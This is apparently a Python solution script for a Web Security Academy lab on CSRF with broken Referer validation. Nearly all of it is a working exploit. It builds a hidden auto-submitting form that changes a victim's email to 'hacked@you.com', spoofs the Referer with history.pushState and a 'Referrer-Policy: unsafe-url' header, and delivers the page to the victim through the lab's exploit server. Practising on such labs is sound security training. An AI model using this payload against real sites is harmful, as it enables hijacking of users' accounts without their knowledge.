##################################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 21/10/2023
#
# Lab: CSRF with broken Referer validation
#
# Steps: 1. Add the `Referrer-Policy` header to your exploit server response headers
#        2. Craft an HTML form for changing the email address with an auto-submit 
#           script that changes the Referer header value using the history.pushState() method
#        3. Deliver the exploit to the victim
#        4. The victim's email will be changed after he trigger the exploit
#
##################################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0ad000ed034517b4843abe97001e00e6.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0ab3000a03ae17f68419bdf9017e007b.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nReferrer-Policy: unsafe-url"
    
# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<html>
                <body>
                <form action="{lab_url}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    history.pushState('', '', '/?{lab_url}');
                    document.forms[0].submit();
                </script>
                </body>
            </html> """

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after he trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



